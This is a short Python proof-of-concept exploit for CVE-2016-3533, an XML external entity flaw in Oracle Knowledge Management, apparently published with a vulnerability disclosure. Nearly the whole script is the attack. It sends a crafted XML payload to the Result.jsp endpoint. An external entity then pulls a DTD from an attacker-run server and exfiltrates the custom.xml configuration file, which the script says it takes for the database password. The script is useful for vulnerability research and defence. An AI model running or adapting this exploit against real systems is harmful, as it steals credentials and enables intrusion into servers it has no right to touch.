#!/usr/bin/python
# Oracle Knowledge Management Castor Library XML External Entity Injection Information Disclosure Vulnerability
# Found by Steven Seeley of Source Incite
# CVE: CVE-2016-3533
# SRC: SRC-2016-23
# Notes:
# - This code steals the C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml file via the XXE bug.
# - You need to run ruby xxeserve.rb -o 0.0.0.0 and use an interface ip for the "local xxe server"
# - Read the README.txt!

import requests
import json
import sys

if len(sys.argv) < 3:
    print "(+) Usage: %s <local xxe server:port> <target>" % sys.argv[0]
    print "(+) Example: %s 172.16.77.1:4567 172.16.77.128" % sys.argv[0]
    sys.exit(1)

xxeserver = sys.argv[1]
target    = sys.argv[2]

payload = {'method' : '2', 'inputXml': '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY %% remote SYSTEM "http://%s/xml?f=C:/Oracle/Knowledge/IM/instances/InfoManager/custom.xml">
%%remote;
%%int;
%%trick;]>''' % xxeserver}

url = 'http://%s:8226/imws/Result.jsp' % target

headers = {'content-type': 'application/x-www-form-urlencoded'}
print "(+) pulling custom.xml for the db password..."
r = requests.post(url, data=payload, headers=headers)
if r.status_code == 200:
    print "(!) Success! please check the gopher.py window!"
